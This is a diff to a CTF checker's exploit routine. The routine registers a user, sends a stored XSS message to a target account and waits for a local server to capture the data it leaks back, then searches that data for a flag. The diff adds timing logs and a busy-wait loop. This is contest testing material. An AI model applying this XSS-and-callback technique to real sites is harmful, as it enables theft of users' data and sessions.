@@ -325,22 +325,39 @@ def server(logger):
 
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
+    start = time.time()
+    startCreateServer = time.time()
     server_thread = threading.Thread(target=server, args=(logger, ))
     server_thread.start()
+    logger.debug(f"Create server time: {time.time() - startCreateServer}")
+    startRegister = time.time()
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
+    logger.debug(f"Register time: {time.time() - startRegister}")
+    startMessage = time.time()
     target = json.loads(task.attack_info)['username']
     payload = encode(exploitMessage.format(task.address), target, logger)
     r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
+    logger.debug(f"Message time: {time.time() - startMessage}")
     assert_equals(r.status_code, 200, "exploit failed")
+    startExploit = time.time()
     xss_test(task, logger)
+    logger.debug(f"Exploit time: {time.time() - startExploit}")
+    startResult = time.time()
     while not result[0]:
-        time.sleep(0.01)
+        pass
+    logger.debug(f"Result time: {time.time() - startResult}")
+    startServerShutdown = time.time()
     webServer[0].shutdown()
     server_thread.join()
+    logger.debug(f"Server shutdown time: {time.time() - startServerShutdown}")
     logger.debug('Server stopped')
-    if flag := searcher.search_flag(result[0]):
+    logger.debug(f"Total time: {time.time() - start}")
+    startFlag = time.time()
+    flag = searcher.search_flag(result[0])
+    logger.debug(f"Flag time: {time.time() - startFlag}")
+    if flag:
         return flag
 
 
